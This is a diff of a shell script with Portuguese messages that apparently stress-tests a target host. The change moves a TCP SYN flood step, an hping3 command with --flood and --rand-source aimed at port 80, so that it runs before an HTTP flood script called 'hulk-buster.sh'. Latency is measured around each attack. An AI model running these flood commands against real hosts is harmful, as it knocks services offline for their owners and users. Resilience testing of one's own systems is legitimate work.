@@ -22,6 +22,21 @@ pingu $IP $REP "medio:"
 echo "============================="
 
 echo ""
+echo "Proximo teste: TCP SYN FLOOD"
+echo ""
+
+sleep 5
+
+echo "============================="
+echo "Ataque TCP SYN FLOOD iniciado"
+xterm -e "sudo hping3 -c 15000 -d 120 -S -w 512 -p 80 --flood --rand-source $IP" &
+sleep 5
+pingu $IP $REP "medio com tcp syn flood:"
+
+sleep 10
+
+echo "============================="
+echo ""
 echo "Proximo teste: hulk"
 echo ""
 
@@ -33,18 +48,6 @@ pingu $IP $REP "medio com ataque hulk:"
 echo "============================="
 bash hulk-buster.sh
 
-echo ""
-echo "Proximo teste: TCP SYN FLOOD"
-echo ""
 
-sleep 5
-
-
-echo "============================="
-echo "Ataque TCP SYN FLOOD iniciado"
-xterm -e "sudo hping3 -c 15000 -d 120 -S -w 512 -p 80 --flood --rand-source $IP" &
-sleep 5
-pingu $IP $REP "medio com tcp syn flood:"
-echo "============================="
 
 rm temp_httping.txt
